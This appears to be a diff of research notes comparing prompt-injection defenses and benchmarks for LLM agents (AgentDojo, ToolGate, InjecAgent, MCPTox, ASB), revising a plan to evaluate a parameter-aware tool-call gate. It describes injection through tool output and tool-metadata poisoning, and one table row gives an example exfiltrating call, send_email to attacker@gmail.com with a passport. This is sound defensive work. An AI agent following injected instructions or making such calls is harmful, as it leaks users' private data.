@@ -124,7 +124,7 @@ AgentDojo's contribution is a **dynamic, stateful, extensible evaluation framewo
 | **Policy source** | LLM itself picks allowed tools from task description (self-reported, before seeing untrusted data) — still prompt-controllable | Structured intent contract parsed once from user request (trusted) + hard rules (no external_send if not asked) — not in agent's prompt, not attacker-controllable |
 | **Granularity** | Tool *name* level (is `send_email` allowed?) | Tool *call* level (is `send_email(to=attacker@gmail.com, content=passport)` consistent with original request?) — catches parameter tampering |
 | **When it fails** | User task needs same tool as attack (e.g., both need `send_email`) → cannot block without breaking task; needs advance planning | Does not need advance planning; checks each call's parameters/recipient against intent, so can allow `send_email(to=user)` while blocking `send_email(to=attacker)` |
-| **Evaluation** | Reports ASR/utility on its own benchmark | Will be evaluated on InjecAgent + MCPTox as well, and can use AgentDojo as stretch — direct cross-benchmark comparison ToolGate never did |
+| **Evaluation** | Reports ASR/utility on its own benchmark | Will be evaluated on InjecAgent and on MCPTox — separate per-vector studies with per-benchmark ASR/FPR tables, a per-benchmark comparison ToolGate never did; AgentDojo remains an optional stretch run |
 
 **Overlap with C1 (gate mechanism):** Low-medium. Tool filter is a gate, but a coarse one. Our gate is strictly more expressive (per-call, parameter-aware, embedding + rule veto) and does not require the agent to correctly pre-predict the tool sequence.
 
@@ -158,7 +158,7 @@ AgentDojo's contribution is a **dynamic, stateful, extensible evaluation framewo
 | Paper in this review | Relationship |
 |---|---|
 | **InjecAgent (Zhan et al., 2024)** | Complementary benchmark — InjecAgent is single-turn, simulated, 1,054 cases; AgentDojo is multi-step, stateful, 629 cases. We evaluate on InjecAgent as primary (cheaper) and AgentDojo as stretch to show multi-step robustness. AgentDojo's §4.2 shows InjecAgent phrasing underperforms their Important message — we will test our gate against both. |
-| **MCPTox (Wang et al., 2025)** | Different vector — MCPTox is poisoning at registration (metadata), AgentDojo is injection at output. Our gate claims to cover both; evaluating on both is the cross-vector contribution. |
+| **MCPTox (Wang et al., 2025)** | Different vector — MCPTox is poisoning at registration (metadata), AgentDojo is injection at output. Our one gate mechanism is evaluated on **both vectors as separate studies** (injection on InjecAgent, poisoning on MCPTox) with per-vector ASR/FPR — the contribution is per-vector reporting, not a single combined number. |
 | **ASB (Zhang et al., 2025)** | Superset — ASB covers DPI/IPI + memory poisoning + PoT backdoor + mixed; AgentDojo covers IPI only but with deeper statefulness. ASB's mixed attack 84% ASR shows single-vector defenses like AgentDojo's tool filter will not suffice alone. |
 | **ToolGate (Liu et al., 2026)** | Predecessor gate — ToolGate is formal Hoare contracts with world-state; AgentDojo's tool filter is informal allowlist. Our gate sits between them: more expressive than allowlist, lighter than formal contracts, and unlike ToolGate is tested adversarially. |
 
